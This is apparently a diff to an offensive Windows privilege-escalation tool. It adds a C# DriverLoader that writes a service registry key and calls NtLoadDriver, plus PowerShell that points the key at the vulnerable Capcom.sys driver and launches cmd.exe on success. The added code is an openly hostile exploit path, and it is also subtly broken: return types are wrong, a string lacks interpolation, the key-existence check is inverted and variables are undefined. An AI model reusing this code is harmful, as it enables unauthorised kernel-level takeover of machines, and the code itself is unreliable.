@@ -60,6 +60,64 @@ using System.Text;
 using System.Diagnostics;
 using System.Linq;
 
+public class DriverLoader
+{
+    [DllImport("ntdll.dll")]
+    public static extern int NtLoadDriver(IntPtr DriverServiceName);
+    
+    [DllImport("advapi32.dll", SetLastError = true)]
+    public static extern bool RegCreateKeyEx(IntPtr hKey, string lpSubKey, uint Reserved, string lpClass, uint dwOptions, uint samDesired, IntPtr lpSecurityAttributes, out IntPtr phkResult, out uint lpdwDisposition);
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    public static extern int RegSetValueEx(IntPtr hKey, string lpValueName, uint Reserved, uint dwType, byte[] lpData, uint cbData);
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    public static extern void RegCloseKey(IntPtr hKey);
+
+    public static void LoadDriver(string registryPath, string driverPath)
+    {
+        IntPtr hKey;
+        uint dwDisposition;
+        
+        // Create the registry key for the driver
+        bool result = RegCreateKeyEx((IntPtr)0x80000002, registryPath, 0, null, 0, 0xF003F, IntPtr.Zero, out hKey, out dwDisposition);
+        if (!result)
+        {
+            // Retrieve and display the error code
+            int errorCode = Marshal.GetLastWin32Error();
+            Console.WriteLine("Failed to create registry key. Error Code: {errorCode}");
+            return;
+        }
+        
+        // Set the ImagePath value
+        byte[] driverPathBytes = System.Text.Encoding.Unicode.GetBytes(driverPath);
+        RegSetValueEx(hKey, "ImagePath", 0, 1, driverPathBytes, (uint)driverPathBytes.Length);
+        
+        // Set other required values
+        RegSetValueEx(hKey, "Type", 0, 4, BitConverter.GetBytes(1), 4);
+        RegSetValueEx(hKey, "ErrorControl", 0, 4, BitConverter.GetBytes(1), 4);
+        RegSetValueEx(hKey, "Start", 0, 4, BitConverter.GetBytes(3), 4);
+        
+        RegCloseKey(hKey);
+        
+        // Load the driver
+        IntPtr driverServiceName = Marshal.StringToHGlobalUni(registryPath);
+        int status = NtLoadDriver(driverServiceName);
+        Marshal.FreeHGlobal(driverServiceName);
+        
+        if (status != 0)
+        {
+            Console.WriteLine("Failed to load driver.");
+        }
+        else
+        {
+            Console.WriteLine("Driver loaded successfully.");
+            // Execute cmd.exe as a test
+            System.Diagnostics.Process.Start("cmd.exe");
+        }
+    }
+}
+
 public class TokenImp {
     [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
     public extern static bool OpenProcessToken(IntPtr processHandle, uint desiredAccess, out IntPtr tokenHandle);
@@ -1187,6 +1245,20 @@ using System; using System.Runtime.InteropServices; public class HelloWorld { [D
                     Start-Process -FilePath $compiledDriverPath
                 } else {
                     Write-Output "[-] Driver compilation failed."
+                }
+
+                # Actual driver (above was placeholder)
+                $currentUserSID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
+                $driverKeyPath = "Registry::HKEY_USERS\$currentUserSID\System\CurrentControlSet\Services\DriverName"
+                # TODO
+                $driverBinaryPath = pwd + "\\Capcom.sys"
+                if (-not (Test-Path $driverKeyPath)) {
+                    Set-ItemProperty -Path $driverKeyPath -Name "ImagePath" -Value $driverBinaryPath
+                    Set-ItemProperty -Path $driverKeyPath -Name "Type" -Value 1  # SERVICE_KERNEL_DRIVER (0x00000001)
+                    Write-Host "Driver registry path created:"
+                    Write-Host "ImagePath set to:" $driverBinaryPath
+                    Write-Host "Type set to: 1 (SERVICE_KERNEL_DRIVER)"
+                    [DriverLoader]::LoadDriver($registryPath, $driverPath)
                 }
             }
             "SeRestorePrivilege" {
